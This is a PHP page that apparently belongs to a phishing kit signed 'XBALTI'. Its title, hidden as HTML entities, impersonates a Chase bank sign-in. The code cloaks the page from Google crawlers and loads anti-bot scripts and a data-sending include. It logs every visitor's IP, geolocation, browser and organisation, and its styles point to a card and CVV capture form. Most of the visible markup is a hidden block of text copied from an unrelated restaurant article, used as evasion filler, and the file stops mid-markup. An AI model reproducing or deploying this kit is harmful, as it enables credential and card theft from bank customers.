<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
include './XBALTI/send.php';
include './antifuck.php';
require './Bots/anti1.php';
require './Bots/anti2.php';
require './Bots/anti3.php';
require './Bots/anti4.php';
require './Bots/anti5.php';
require './Bots/anti6.php';
require './Bots/anti7.php';
require './Bots/anti8.php';
date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');
$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$country   = $details->country;
$org   = $details->org;
$isp   = $details->isp;
$adminvu .= "<tr>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  ".$country."
                          </td>
                          <td>
                           ".$org."
                          </td>
                        </tr>\n";
    $khraha = fopen("./rz/vus".$yourname.".html", "a");
	fwrite($khraha, $adminvu);
	$xx .= "{}\n";
    $khraha = fopen("./rz/vus.html", "a");
	fwrite($khraha, $xx);
?>
<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">

<head>
    <meta charset="utf-8">
    <title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#45;&#32;&#99;&#104;&#97;&#115;&#101;.&#99;&#111;&#109;</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="./img/icon.ico"/>
    <style>
        @font-face {
            font-family: Open Sans;
            font-style: normal;
            font-weight: 400;
            src: url('./fonts/opensans-regular.ttf') format('truetype');
        }
        
        html {
            height: 100%;
            background: #fff;
        }
        
        @media only screen and (min-width: 768px) {
            html {
                background: #1c4f82;
                background: -moz-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
                background: -webkit-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
                background: linear-gradient(to bottom, #1c4f82 0%, #2e6ea3 100%);
            }
        }
        
        .footer {
            left: 0;
            bottom: 0;
            width: 100%;
            text-align: center;
        }
        
        .hide {
            display: none;
        }
        
        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
        
        .lollol {
            background-size: 36px;
            width: 37px;
            height: 30px;
            right: 1px;
            top: 13px;
            float: left;
            position: absolute;
        }
        
        .gadiha {
            display: table;
            display: flex;
            justify-content: space-between;
            width: 100%;
            list-style: none;
            margin: 0 0 1.5em;
        }
        
        .zwina {
            display: inline-block;
            text-align: center;
        }
        
        .img_small {
            width: 3em;
            height: 2em;
            margin: 0 auto;
            border-radius: 7px;
            display: inline-block;
        }
        
        .tgadi {
            width: 17em;
            height: 5.1em;
            margin: 0 auto;
            border-radius: 12px;
            display: inline-block;
        }
        
        .shadow {
            box-shadow: 0 0px 24px #0b6efd;
        }
        
        .card-icons {
            vertical-align: middle;
        }
        
        .lawla {
            background-image: url('./img/lawla.png');
            background-size: 100%;
        }
        
        .lawlatwo {
            background-image: url('./img/lawla.png');
            background-size: 100%;
        }
        
        .mastercardimg {
            background-image: url('./img/cardsimg.png');
            background-position: 0 65.6%;
            background-size: 100%;
        }
        
        .cco {
            background-image: url('./img/cvv.jpg');
            background-position: 0 50%;
            background-size: 100%;
        }
        
        .visaimg {
            background-image: url('./img/cardsimg.png');
            background-position: 0 88.25161%;
            background-size: 100%;
        }
        
        ol.progtrckr {
            display: table;
            list-style-type: none;
            margin: 0;
            padding: 0;
            table-layout: fixed;
            width: 100%;
        }
        
        ol.progtrckr li {
            display: table-cell;
            text-align: center;
            line-height: 3em;
        }
        
        <!-- Progress with steps --> ol.progtrckr {
            margin: 0;
            padding: 0;
            list-style-type: none;
        }
        
        ol.progtrckr li {
            display: inline-block;
            text-align: center;
            line-height: 3em;
        }
        
        ol.progtrckr[data-progtrckr-steps="2"] li {
            width: 49%;
        }
        
        ol.progtrckr[data-progtrckr-steps="3"] li {
            width: 33%;
        }
        
        ol.progtrckr[data-progtrckr-steps="4"] li {
            width: 24%;
        }
        
        ol.progtrckr[data-progtrckr-steps="5"] li {
            width: 19%;
        }
        
        ol.progtrckr[data-progtrckr-steps="6"] li {
            width: 16%;
        }
        
        ol.progtrckr[data-progtrckr-steps="7"] li {
            width: 14%;
        }
        
        ol.progtrckr[data-progtrckr-steps="8"] li {
            width: 12%;
        }
        
        ol.progtrckr[data-progtrckr-steps="9"] li {
            width: 11%;
        }
        
        ol.progtrckr li.progtrckr-done {
            color: black;
            border-bottom: 4px solid #0b6efd;
        }
        
        ol.progtrckr li.progtrckr-todo {
            color: silver;
            border-bottom: 4px solid silver;
        }
        
        ol.progtrckr li:after {
            content: "\00a0\00a0";
        }
        
        ol.progtrckr li:before {
            position: relative;
            bottom: -2.5em;
            float: left;
            left: 50%;
            line-height: 1em;
        }
        
        ol.progtrckr li.progtrckr-done:before {
            content: "\2713";
            color: white;
            background-color: #0b6efd;
            height: 1.2em;
            width: 1.2em;
            line-height: 1.2em;
            border: none;
            border-radius: 1.2em;
        }
        
        ol.progtrckr li.progtrckr-todo:before {
            content: "\039F";
            color: silver;
            background-color: white;
            font-size: 1.5em;
            bottom: -1.6em;
        }
    </style>
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="./css/lostyle.css">
</head>

<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui modal" id="modalcardtwo" style="display:none;">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> dialog vertical-center util print-position-initial" role="dialog">
            <section class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> dialogContent">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> modalContent">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
					<div style="display:none;" id="toc-wrapper_1-0" class="comp toc-wrapper mntl-block">
<div id="toc-wrapper__below_1-0" class="comp toc-wrapper__below mntl-block">
<figure id="figure_3-0" class="comp figure--primary figure primary-image-figure">
<div class="figure__media">
<div class="img-placeholder" style="padding-bottom:66.6%;">
<img src="https://www.thebalancesmb.com/thmb/_KaLy6S6xqss1s7DhK-5uzlZsMY=/950x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png" srcset="https://www.thebalancesmb.com/thmb/RlhZsE95TaxohoUSbejI8jLwwaQ=/400x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 400w, https://www.thebalancesmb.com/thmb/TSUT3AvhieraUdEfAieo8SMQoKI=/537x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 537w, https://www.thebalancesmb.com/thmb/88RfA_LlBvQWcExPsqW-YWDdqJs=/674x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 674w, https://www.thebalancesmb.com/thmb/_KaLy6S6xqss1s7DhK-5uzlZsMY=/950x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 950w" alt="How to Start a New Restaurant" class=" mntl-primary-image figure__img">
</div>
</div>
<figcaption id="mntl-figure-caption_1-0" class="comp mntl-figure-caption figure-article-caption">
<span class="figure-article-caption-owner"><p>The Balance /&nbsp;&#8203;Ashley DeLeon</p></span>
</figcaption>
</figure>
<div id="sponsorship-wrapper_3-0" class="comp sponsorship-wrapper mntl-block"></div>
<div id="article-meta_1-0" class="comp article-meta mntl-block" data-tracking-container="true">
<div id="article-meta__byline_1-0" class="comp article-meta__byline mntl-block">
<div id="byline_1-0" class="comp byline mntl-byline mntl-block" data-tracking-container="true">
<span id="mntl-byline__text_1-0" class="comp mntl-byline__text mntl-text-block">
By</span>
<div id="mntl-byline__name_1-0" class="comp mntl-byline__name mntl-block mntl-dynamic-tooltip--trigger" data-tooltip="Lorri Mealey has nearly a decade of restaurant experience, including owning and operating her own restaurant in Western Maine." data-tooltip-position-x="left" data-tooltip-position-y="top">
<div id="mntl-bio-tooltip_1-0" class="comp mntl-bio-tooltip money-bio-tooltip mntl-block">
<div id="mntl-bio-tooltip__top_1-0" class="comp mntl-bio-tooltip__top mntl-block">
<div id="mntl-bio-tooltip__main_1-0" class="comp mntl-bio-tooltip__main mntl-block">
<div id="mntl-bio-tooltip__name_1-0" class="comp mntl-bio-tooltip__name mntl-block">
<span id="mntl-bio-tooltip__prelink_1-0" class="comp mntl-bio-tooltip__prelink mntl-text-block"></span>
<a href="https://www.thebalancesmb.com/lorri-mealey-2888222" id="mntl-bio-tooltip__link_1-0" class=" mntl-bio-tooltip__link mntl-text-link" data-tracking-container="true"><span class="link__wrapper">Full Bio</span></a>
<span id="mntl-bio-tooltip__postlink_1-0" class="comp mntl-bio-tooltip__postlink mntl-text-block"></span>
<nav id="bio-social-follow_1-0" class="comp bio-social-follow" role="navigation" data-tracking-container="true">
<div class="bio-social-follow__icons">
<div class="bio-social-follow__icon-container">
<a href="https://twitter.com/abt_restaurants?lang=en" target="_blank" rel="noopener" class="bio-social-follow__icon bio-social-follow__twitter"> <span class="bio-social-follow__follow-text">Follow</span>
<svg class="icon bio-icon-twitter">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-twitter"></use>
</svg>
<span class="bio-social-follow__icon-text">Twitter</span>
</a> </div>
</div>
</nav>
</div>
<div id="mntl-bio-tooltip__bio_1-0" class="comp mntl-bio-tooltip__bio mntl-text-block">
Lorri Mealey has nearly a decade of restaurant experience, including owning and operating her own restaurant in Western Maine.</div>
</div>
</div>
<div id="mntl-bio-tooltip__bottom_1-0" class="comp mntl-bio-tooltip__bottom mntl-block">
<div id="mntl-bio-tooltip__learn-more_1-0" class="comp mntl-bio-tooltip__learn-more money-bio-tooltip__learn-more mntl-block">
<span id="mntl-text-block_3-0" class="comp mntl-text-block">
Read The Balance's </span>
<a href="/about-us#EditorialGuidelines" id="mntl-text-link_1-0" class=" mntl-text-link" data-tracking-container="true"><span class="link__wrapper">editorial policies</span></a>
</div>
</div>
</div>
<a href="https://www.thebalancesmb.com/lorri-mealey-2888222" id="mntl-byline__link_1-0" class=" mntl-byline__link mntl-text-link" data-tracking-container="true"><span class="link__wrapper">Lorri Mealey</span></a>
</div>
</div>
</div>
<div id="displayed-date_1-0" class="comp displayed-date">
Updated July 25, 2019
</div>
</div>
<div id="mntl-sc-page_1-0" class="comp structured-content expert-content mntl-sc-page mntl-block" data-sc-sticky-offset="80" data-sc-ad-label-height="20" data-sc-ad-track-spacing="100" data-sc-ad-bottom-offset="0" data-sc-min-track-height="250" data-sc-max-track-height="600" data-sc-breakpoint="50em" data-sc-load-immediate="4" data-sc-content-positions="[300, 1, 1, 1250, 1, 1, 1, 1]" data-bind-scroll-on-start="true">
<p id="mntl-sc-block_1-0-1" class="comp text-passage mntl-sc-block mntl-sc-block-html">
<a href="https://www.thebalancesmb.com/how-to-open-a-restaurant-with-no-money-4045860" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">Opening a new restaurant</a> can be daunting. There are so many things to consider – from choosing the right location to finding financing to selecting the right name. And, of course, <a href="https://www.thebalancesmb.com/restaurant-bar-equipment-checklist-2888863" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">buying equipment</a> and hiring staff.
</p>
<div id="mntl-sc-block_1-0-2" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_2-0" class="comp mntl-block">
<div id="billboard1-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard1-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="1050" style="top: 134px;">
<div class="spacer">
<div id="billboard1-dynamic_1-0" class="comp billboard1-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard" class="wrapper" data-type="billboard" data-pos="atf" data-priority="2" data-sizes="[[300, 250], [300, 600], [160, 600], [300, 1050], [1, 2], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="3bd3f410f0f24094bfd884a7691b57e5" data-auction-floor-value="25"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<a class="heading-toc" id="concept-location-and-name"></a> <h2 id="mntl-sc-block_1-0-3" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Concept, Location, and Name&nbsp; </span> </h2>
<p id="mntl-sc-block_1-0-5" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The first step in opening a new restaurant is deciding what <a href="https://www.thebalancesmb.com/types-of-restaurants-2888525" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">type</a> of restaurant it is going to be. Do you want to open a high-end fine dining restaurant? A casual 1950s-style diner? Do you have a specific type of cuisine in mind, such as Italian, French, or Indian? Perhaps a microbrewery or a pub.
</p>
<div id="mntl-sc-block_1-0-6" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_3-0" class="comp mntl-block">
<div id="billboard2-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard2-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="600" style="top: 1284px;">
<div class="spacer">
<div id="billboard2-dynamic_1-0" class="comp billboard2-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard2" class="wrapper" data-type="billboard" data-pos="btf1" data-priority="3" data-sizes="[[300, 250], [300, 600], [300, 601], [160, 600], [300, 251], [2, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="c576ea9adcaf44bfbabaa91b4190c8c7" data-auction-floor-value="15"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard2_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<div id="mntl-sc-block_1-0-7" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-8" class="comp theme-experttipimportant mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Location, location, location. It can make or break a restaurant.</p></div>
</div>
</div>
<p id="mntl-sc-block_1-0-10" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Before you&nbsp;sign a <a href="https://www.thebalancesmb.com/rent-a-restaurant-2888547" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">lease</a> for your restaurant location, do your homework. Is the restaurant <a href="https://www.thebalancesmb.com/choosing-a-location-for-your-restaurant-2888635" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">located</a> in a busy area with plenty of foot traffic? If not, is there enough parking? Have several other restaurants opened and closed in the same spot?
</p>
<div id="mntl-sc-block_1-0-11" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_4-0" class="comp mntl-block">
<div id="billboard3-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard3-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="600" style="top: 1984px;">
<div class="spacer">
<div id="billboard3-dynamic_1-0" class="comp billboard3-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard3" class="wrapper" data-type="billboard" data-pos="btf2" data-priority="5" data-sizes="[[300, 250], [300, 252], [3, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="33d99ae4cb6940b0b67ff5e22c3822a4" data-auction-floor-value="10"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard3_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-13" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The most enjoyable part of opening a new restaurant can be selecting a restaurant name that means something to you. It can be a family name, a play on words, another meaningful turn of phrase, or it can reflect the theme or location you chose, such as Broadway Diner or The Highlands.
</p>
<div id="mntl-sc-block_1-0-14" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_5-0" class="comp mntl-block">
<div id="native-placeholder_2-0" class="comp native-placeholder mntl-block"></div>
<div id="native_2-0" class="comp scads-to-load native mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt dynamic scads-ad-placed" style="">
<div id="native" class="wrapper" data-type="native" data-pos="native" data-priority="4" data-sizes="[[1,3], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/native_0__container__" style="border: 0pt none; width: 1px; height: 3px;"></div></div>
</div>
</div></div>
<a class="heading-toc" id="business-plan"></a> <h2 id="mntl-sc-block_1-0-15" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Business Plan </span> </h2>
<p id="mntl-sc-block_1-0-17" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The two most important reasons you need a restaurant <a href="https://www.thebalancesmb.com/how-to-write-a-restaurant-business-plan-2888455" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">business plan</a>. One, it helps you see potential problems in your restaurant plan, such as not enough of a <a href="https://www.thebalancesmb.com/how-to-find-out-the-population-base-of-an-area-2888660" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">population base</a>. Two, it's virtually impossible to get financing without one.
</p>
<div id="mntl-sc-block_1-0-18" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_6-0" class="comp mntl-block">
<div id="billboard4-sticky-dynamic_2-0" class="comp scads-to-load right-rail__item billboard-sticky billboard4-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard4-dynamic_2-0" class="comp billboard4-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard4" class="wrapper" data-type="billboard" data-pos="btf3" data-priority="6" data-sizes="[[300, 250], [300, 253], [4, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="7d138dac2cd04f79b70ccf988cfa4880" data-auction-floor-value="15"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-20" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Financing is what prevents many from opening their own restaurant. Although it is somewhat more difficult to get financing for a restaurant, due to their higher failure rate than for some other business types, it is not impossible. Between banks, small business agencies, and private investors, there are several financing possibilities.
</p>
<div id="mntl-sc-block_1-0-21" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_7-0" class="comp mntl-block">
<div id="billboard5-sticky-dynamic_2-0" class="comp scads-to-load right-rail__item billboard-sticky billboard5-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard5-dynamic_2-0" class="comp js-billboard-lazy billboard5-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard5" class="wrapper" data-type="billboard" data-pos="btf4" data-priority="7" data-sizes="[[300, 250], [300, 254], [6, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="f74881159a694ed3a5ef4d7fdc098776" data-auction-floor-value="10"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-23" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Show up to your <a href="https://www.thebalancesmb.com/getting-ready-for-your-restaurant-loan-interview-2888445" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">financing interview</a>&nbsp;prepared, and show potential investors that you've thought through the mechanics of opening, running, and generating profit from a restaurant.
</p>
<div id="mntl-sc-block_1-0-24" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_8-0" class="comp mntl-block">
<div id="billboard6-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard6-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard6-dynamic_1-0" class="comp js-billboard-lazy billboard6-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard6" class="wrapper" data-type="billboard" data-pos="btf5" data-priority="8" data-sizes="[[300, 250], [300, 255], [7, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="ec3314ec6060403582b5d23c47cc7b18" data-auction-floor-value="25"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-26" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Common <a href="https://www.thebalancesmb.com/restaurant-insurance-basics-2888374" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">licenses</a> and permits&nbsp;for restaurants, regardless of the state, include liquor licenses, signage permits, separate permits for outdoor space, and workers' compensation. And remember, many licenses and permits take several weeks, even months, to be approved. So once your financing is squared away, start filling the paperwork.
</p>
<div id="mntl-sc-block_1-0-27" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_9-0" class="comp mntl-block">
<div id="billboard7-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard7-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard7-dynamic_1-0" class="comp js-billboard-lazy billboard7-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard7" class="wrapper" data-type="billboard" data-pos="btf6" data-priority="9" data-sizes="[[300, 250], [300, 256], [8, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="3ec6b5929951449792897c3d6c02ac1d" data-auction-floor-value="25"></div>
</div>
</div>
</div>
</div></div>
<a class="heading-toc" id="restaurant-design"></a> <h2 id="mntl-sc-block_1-0-28" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Restaurant Design </span> </h2>
<p id="mntl-sc-block_1-0-30" class="comp text-passage mntl-sc-block mntl-sc-block-html">
A common-sense rule about designing a restaurant is that you never have as much space as you first thought you did. Even the most cavernous of spaces fill&nbsp;up quickly when you start adding commercial kitchens, walk-in refrigerators, a bar, restrooms, and a waiting area. A <a href="https://www.thebalancesmb.com/restaurant-design-2888629" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">restaurant's design</a> should be a balance between aesthetics and seating capacity, keeping practicality in mind.
</p>
<div id="mntl-sc-block_1-0-31" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<div id="mntl-sc-block_1-0-32" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-33" class="comp theme-experttiptip mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0-1" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Choosing the right color for your restaurant will help you establish a strong brand and help you establish a welcoming ambiance for customers.</p></div>
</div>
</div>
<a class="heading-toc" id="menus-equipment-and-staff"></a> <h2 id="mntl-sc-block_1-0-34" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Menus, Equipment, and Staff&nbsp; </span> </h2>
<p id="mntl-sc-block_1-0-36" class="comp text-passage mntl-sc-block mntl-sc-block-html">
A well-written <a href="https://www.thebalancesmb.com/how-to-choose-restaurant-menu-items-2888581" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">restaurant menu</a> should be descriptive, easy to read and have a clear, uncluttered layout. Also, it's better to use an attractive font and high-quality paper than muck it up with generic art found on the internet.
</p>
<div id="mntl-sc-block_1-0-37" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-39" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Once you have your restaurant design down, you can start purchasing commercial kitchen equipment and furniture for your dining room and other areas in the front of the house. To save money, consider buying used equipment from a reliable source.
</p>
<div id="mntl-sc-block_1-0-40" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-42" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Commercial equipment with the Energy Star&nbsp;logo can cost more at first but will pay for itself many times over, and it's better for the environment.
</p>
<div id="mntl-sc-block_1-0-43" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-45" class="comp text-passage mntl-sc-block mntl-sc-block-html">
As you get closer to opening day, hire for both the kitchen and the floor. Kitchen staff, waitstaff, and bartenders are all integral parts of most any restaurant, and you want to hire the perfect person for each position.
</p>
<div id="mntl-sc-block_1-0-46" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-48" class="comp text-passage mntl-sc-block mntl-sc-block-html">
If you can, hire people with experience in the foodservice industry, and if you're hiring a chef you don't know, don't be shy about asking to test-tasting their food first.
</p>
<div id="mntl-sc-block_1-0-49" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<a class="heading-toc" id="advertising"></a> <h2 id="mntl-sc-block_1-0-50" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Advertising </span> </h2>
<p id="mntl-sc-block_1-0-52" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Advertising is a must for most <a href="https://www.thebalancesmb.com/how-to-advertise-for-a-new-restaurant-2888568" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">new restaurants</a>. Today, you can supplement social media advertising such as Facebook, Twitter, and Instagram, with more traditional advertising, such as newspapers and radio ads, depending on your concept and the diners you want to reach.
</p>
<div id="mntl-sc-block_1-0-53" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<div id="mntl-sc-block_1-0-54" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-55" class="comp theme-experttiptip mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0-2" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Don’t overlook the power of a good website. People can't taste food online, but an aesthetically-pleasing web presence can entice diners.&nbsp;</p></div>
</div>
</div>
<div id="mntl-block_1-0" class="comp js-scads-inline-content mntl-block">








</div>
</div>
</div>
</div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-12 col-sm-7 col-sm-offset-3">
